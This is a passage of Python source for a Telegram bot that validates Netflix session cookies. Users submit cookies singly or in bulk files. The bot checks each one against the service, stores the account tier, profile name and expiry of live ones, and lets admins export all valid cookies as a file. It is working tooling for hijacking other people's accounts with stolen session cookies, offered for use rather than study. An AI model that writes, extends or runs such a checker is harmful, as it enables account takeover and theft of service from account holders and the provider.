            "❌ Usage: /check `<cookie>`\n\n"
            "You can also send a cookie directly by pasting it in chat.\n"
            "Supports Netscape format, Standard format, and Base64."
        )
        return
    
    cookie = " ".join(args)
    
    if not validate_cookie(cookie):
        await update.message.reply_text(
            "❌ Invalid cookie format.\n"
            "Make sure it's a valid Netflix cookie string.\n"
            "Supported formats: Standard, Netscape, Base64."
        )
        return
    
    # Add cookie to database
    cookie_id = db.add_cookie(cookie, user_id)
    
    # Send checking message
    msg = await update.message.reply_text(
        "🔄 *Checking cookie...*\n"
        f"Cookie ID: `{cookie_id[:8]}`\n"
        "Please wait...",
        parse_mode="Markdown"
    )
    
    # Check cookie
    result = await NetflixChecker.check_single_cookie(cookie)
    
    # Update cookie status
    if result.get("valid"):
        db.update_cookie_status(cookie_id, "valid", {
            "account_tier": result.get("account_tier"),
            "profile_name": result.get("profile_name"),
            "profile_language": result.get("profile_language"),
            "maturity_level": result.get("maturity_level"),
            "expires_at": result.get("expires_at")
        })
        db.increment_user_stats(user_id, 1, 1)
    else:
        status = "expired" if "expired" in str(result.get("error", "")).lower() else "invalid"
        db.update_cookie_status(cookie_id, status, {
            "error": result.get("error")
        })
        db.increment_user_stats(user_id, 1, 0)
    
    db.log_check(user_id, cookie_id, result.get("valid") and "valid" or "invalid", result)
    db.update_user_activity(user_id)
    
    # Build response
    if result.get("valid"):
        response = (
            "✅ *Valid Cookie!*\n\n"
            f"📊 *Account Tier:* {result.get('account_tier', 'Unknown')}\n"
            f"👤 *Profile Name:* {result.get('profile_name', 'Unknown')}\n"
            f"🌍 *Language:* {result.get('profile_language', 'Unknown')}\n"
            f"🔞 *Maturity Level:* {result.get('maturity_level', 'Unknown')}\n"
        )
        if result.get('expires_at'):
            response += f"📅 *Expires:* {result.get('expires_at')}\n"
        response += f"\n🆔 `{cookie_id[:8]}`"
    else:
        response = (
            "❌ *Invalid Cookie!*\n\n"
            f"Error: {result.get('error', 'Unknown error')}\n"
            f"\n🆔 `{cookie_id[:8]}`"
        )
    
    await msg.edit_text(response, parse_mode="Markdown")

async def handle_cookie_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct cookie paste in chat"""
    user_id = update.effective_user.id
    
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return
    
    cookie = update.message.text.strip()
    
    if not validate_cookie(cookie):
        await update.message.reply_text(
            "❌ Invalid cookie format.\n"
            "Please use /check <cookie> or upload a .txt file with /bulk\n"
            "Supported formats: Standard, Netscape, Base64."
        )
        return
    
    context.args = [cookie]
    await check_single(update, context)

# ----------------------------- BULK CHECK (FIXED) -----------------------------
BULK_CHECK_STATE = 1

async def bulk_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start bulk check process"""
    user_id = update.effective_user.id
    
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return ConversationHandler.END
    
    await update.message.reply_text(
        "📁 *Bulk Cookie Check*\n\n"
        "Please upload a `.txt` file with cookies (one per line).\n"
        f"Maximum: {MAX_BULK_CHECK} cookies per batch.\n"
        "Supported formats: Standard, Netscape, Base64.\n\n"
        "To cancel, send /cancel."
    )
    return BULK_CHECK_STATE

async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded file for bulk check"""
    user_id = update.effective_user.id
    
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Not approved.")
        return ConversationHandler.END
    
    document = update.message.document
    if not document:
        await update.message.reply_text("❌ No file uploaded.")
        return BULK_CHECK_STATE
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Only .txt files are supported.")
        return BULK_CHECK_STATE
    
    msg = await update.message.reply_text("📥 Downloading file...")
    
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        
        cookies = file_content.decode('utf-8', errors='ignore').splitlines()
        cookies = [c.strip() for c in cookies if c.strip()]
        
        if not cookies:
            await msg.edit_text("❌ No cookies found in file.")
            return ConversationHandler.END
        
        if len(cookies) > MAX_BULK_CHECK:
            await msg.edit_text(
                f"❌ Too many cookies! Maximum {MAX_BULK_CHECK} per batch.\n"
                f"Found: {len(cookies)}"
            )
            return ConversationHandler.END
        
        added = db.add_cookies_bulk(cookies, user_id)
        valid_cookies = [c for c in added if c.get("status") == "added"]
        
        if not valid_cookies:
            await msg.edit_text("❌ No valid cookies found in file. All skipped or invalid.")
            return ConversationHandler.END
        
        await msg.edit_text(
            f"✅ Added {len(valid_cookies)} cookies from file.\n"
            f"❌ Invalid/skipped: {len(cookies) - len(valid_cookies)}\n\n"
            f"🔄 Starting validation..."
        )
        
        results = await NetflixChecker.check_bulk_cookies([c["cookie"] for c in valid_cookies])
        
        valid_count = 0
        for result in results:
            cookie = result.get("cookie", "")
            if not cookie:
                continue
            cookie_hash = hashlib.sha256(cookie.encode()).hexdigest()
            cookie_doc = db.get_cookie_by_hash(cookie_hash)
            
            if cookie_doc:
                if result.get("valid"):
                    db.update_cookie_status(cookie_doc["_id"], "valid", {
                        "account_tier": result.get("account_tier"),
                        "profile_name": result.get("profile_name"),
                        "profile_language": result.get("profile_language"),
                        "maturity_level": result.get("maturity_level"),
                        "expires_at": result.get("expires_at")
                    })
                    valid_count += 1
                else:
                    status = "expired" if "expired" in str(result.get("error", "")).lower() else "invalid"
                    db.update_cookie_status(cookie_doc["_id"], status, {
                        "error": result.get("error")
                    })
                
                db.log_check(user_id, cookie_doc["_id"], result.get("valid") and "valid" or "invalid", result)
        
        db.increment_user_stats(user_id, len(results), valid_count)
        db.update_user_activity(user_id)
        
        response = (
            "📊 *Bulk Check Results*\n\n"
            f"Total processed: {len(results)}\n"
            f"✅ Valid: {valid_count}\n"
            f"❌ Invalid/Expired: {len(results) - valid_count}\n"
        )
        await update.message.reply_text(response, parse_mode="Markdown")
        
    except Exception as e:
        logger.error(f"Bulk check error: {e}")
        await msg.edit_text(f"❌ Error processing file: {str(e)}")
    
    return ConversationHandler.END

async def cancel_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Bulk operation cancelled.")
    return ConversationHandler.END

# ----------------------------- VALID COOKIES --------------------------
async def valid_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Not approved.")
        return
    
    cookies = db.get_valid_cookies(limit=20)
    
    if not cookies:
        await update.message.reply_text("📭 No valid cookies found.")
        return
    
    response = "✅ *Valid Cookies*\n\n"
    for i, cookie in enumerate(cookies[:10], 1):
        response += (
            f"{i}. Tier: {cookie.get('account_tier', 'Unknown')}\n"
            f"   Profile: {cookie.get('profile_name', 'Unknown')}\n"
            f"   ID: `{cookie['_id'][:8]}`\n\n"
        )
    
    if len(cookies) > 10:
        response += f"\n... and {len(cookies) - 10} more."
    
    await update.message.reply_text(response, parse_mode="Markdown")

# ----------------------------- STATS COMMANDS --------------------------
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = db.get_user(user_id)
    
    if not user:
        await update.message.reply_text("❌ User not found.")
        return
    
    stats_data = db.get_cookie_stats()
    user_checks = db.get_user_checks(user_id, limit=5)
    
    response = (
        f"📊 *Your Statistics*\n\n"
        f"Total Checks: {user.get('total_checks', 0)}\n"
        f"✅ Valid Cookies: {user.get('valid_cookies', 0)}\n"
        f"📅 Since: {user.get('created_at', get_current_time()).strftime('%Y-%m-%d')}\n\n"
        f"🌐 *Global Stats*\n"
        f"Total Cookies: {stats_data['total']}\n"
        f"✅ Valid: {stats_data['valid']}\n"
        f"❌ Invalid: {stats_data['invalid']}\n"
        f"⏰ Expired: {stats_data['expired']}\n"
        f"⏳ Pending: {stats_data['pending']}\n\n"
        f"*Tiers*\n"
        f"⭐ Premium: {stats_data['tiers']['Premium']}\n"
        f"📺 Standard: {stats_data['tiers']['Standard']}\n"
        f"📱 Basic: {stats_data['tiers']['Basic']}\n"
    )
    
    if user_checks:
        response += f"\n*Recent Checks*\n"
        for check in user_checks[:5]:
            status = "✅" if check.get("status") == "valid" else "❌"
            timestamp = check.get("timestamp", get_current_time()).strftime("%H:%M")
            response += f"{status} {timestamp} - {check.get('status')}\n"
    
    await update.message.reply_text(response, parse_mode="Markdown")

# ----------------------------- ADMIN COMMANDS ---------------------------
@admin_required
async def admin_approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 1:
            await update.message.reply_text("❌ Usage: /approve <user_id>")
            return
        
        user_id = int(context.args[0])
        db.create_user(user_id)
        
        if db.approve_user(user_id):
            await update.message.reply_text(f"✅ User {user_id} approved.")
            try:
                await context.bot.send_message(
                    user_id,
                    "✅ Your account has been approved!\nYou can now use the Netflix cookie checker bot."
                )
            except:
                pass
        else:
            await update.message.reply_text("❌ Failed to approve user.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

@admin_required
async def admin_disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 1:
            await update.message.reply_text("❌ Usage: /disapprove <user_id>")
            return
        
        user_id = int(context.args[0])
        if db.disapprove_user(user_id):
            await update.message.reply_text(f"✅ User {user_id} disapproved.")
        else:
            await update.message.reply_text("❌ Failed to disapprove user.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

@admin_required
async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = list(db.users.find({"user_id": {"$ne": None}}))
    
    if not users:
        await update.message.reply_text("📭 No users found.")
        return
    
    approved = sum(1 for u in users if u.get("approved", False))
    admins = sum(1 for u in users if u.get("is_admin", False))
    
    response = f"👥 *Users*\n\nTotal: {len(users)}\n✅ Approved: {approved}\n👑 Admins: {admins}\n\n"
    
    for user in users[:15]:
        status = "✅" if user.get("approved") else "❌"
        if user.get("is_admin"):
            status = "👑"
        response += f"{status} {user['user_id']} - Checks: {user.get('total_checks', 0)}\n"
    
    if len(users) > 15:
        response += f"\n... and {len(users) - 15} more."
    
    await update.message.reply_text(response, parse_mode="Markdown")

@admin_required
async def admin_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = db.get_cookie_stats()
    
    response = (
        f"🍪 *Cookie Statistics*\n\n"
        f"Total: {stats['total']}\n"
        f"✅ Valid: {stats['valid']}\n"
        f"❌ Invalid: {stats['invalid']}\n"
        f"⏰ Expired: {stats['expired']}\n"
        f"⏳ Pending: {stats['pending']}\n\n"
        f"*Tier Distribution*\n"
        f"⭐ Premium: {stats['tiers']['Premium']}\n"
        f"📺 Standard: {stats['tiers']['Standard']}\n"
        f"📱 Basic: {stats['tiers']['Basic']}\n"
    )
    
    await update.message.reply_text(response, parse_mode="Markdown")

@admin_required
async def admin_export(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cookies = db.get_valid_cookies()
    
    if not cookies:
        await update.message.reply_text("📭 No valid cookies to export.")
        return
    
    os.makedirs(EXPORT_DIR, exist_ok=True)
    filename = f"netflix_valid_{int(time.time())}.txt"
    filepath = os.path.join(EXPORT_DIR, filename)
    
    with open(filepath, 'w') as f:
        f.write("# Netflix Valid Cookies\n")
        f.write(f"# Exported: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Total: {len(cookies)}\n\n")
        
        for cookie in cookies:
            f.write(f"{cookie['cookie']}\n")
    
    with open(filepath, 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=filename,
            caption=f"✅ {len(cookies)} valid cookies exported."
        )
    
    os.remove(filepath)

@admin_required
async def admin_cleanup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("🔄 Cleaning up invalid cookies...")
    deleted = db.delete_invalid_cookies()
    await msg.edit_text(f"✅ Deleted {deleted} invalid/expired cookies.")

@admin_required
async def admin_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Yes, clear all", callback_data="clear_confirm"),
            InlineKeyboardButton("❌ Cancel", callback_data="clear_cancel")
        ]
    ])
    
    await update.message.reply_text(
        "⚠️ *DANGER: Clear All Cookies*\n\n"
        "This will delete ALL cookies from the database.\n"
        "This action cannot be undone.\n\n"
        "Are you sure?",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )

async def clear_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "clear_confirm":
        user_id = query.from_user.id
        if user_id not in ADMIN_IDS:
            await query.edit_message_text("❌ Unauthorized.")
            return
        
        total = db.cookies.count_documents({})
        db.cookies.delete_many({})
        await query.edit_message_text(f"✅ Cleared {total} cookies from database.")
    else:
        await query.edit_message_text("❌ Operation cancelled.")

# ----------------------------- ERROR HANDLER ---------------------------
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error: {context.error}")
    try:
        await update.message.reply_text("⚠️ Internal error occurred. Please try again.")
    except:
        pass

# ----------------------------- MAIN APPLICATION ------------------------
def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set!")
        sys.exit(1)
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", start))
    application.add_handler(CommandHandler("check", check_single))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("valid", valid_cookies))
    application.add_handler(CommandHandler("proxy", proxy_status))
    
    # Bulk conversation (FIXED)
    bulk_conv = ConversationHandler(
        entry_points=[CommandHandler("bulk", bulk_start)],
        states={
            BULK_CHECK_STATE: [
                MessageHandler(filters.Document.ALL, handle_bulk_file),
                # If user sends text other than /cancel, ask again
                MessageHandler(filters.TEXT & ~filters.COMMAND, 
                               lambda update, context: update.message.reply_text("Please send a .txt file or /cancel."))
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_bulk)]
    )
    application.add_handler(bulk_conv)
    
    # Admin commands
    application.add_handler(CommandHandler("approve", admin_approve))
    application.add_handler(CommandHandler("disapprove", admin_disapprove))
    application.add_handler(CommandHandler("users", admin_users))
    application.add_handler(CommandHandler("cookies", admin_cookies))
    application.add_handler(CommandHandler("export", admin_export))
    application.add_handler(CommandHandler("cleanup", admin_cleanup))
    application.add_handler(CommandHandler("clear", admin_clear))
    
    # Message handlers (text for direct cookie paste)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_message))
    # Note: Document handler is now only inside bulk conversation, not global.
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(clear_callback, pattern="^clear_"))
    
    application.add_error_handler(error_handler)
    
    logger.info("Netflix Cookie Checker Bot started!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()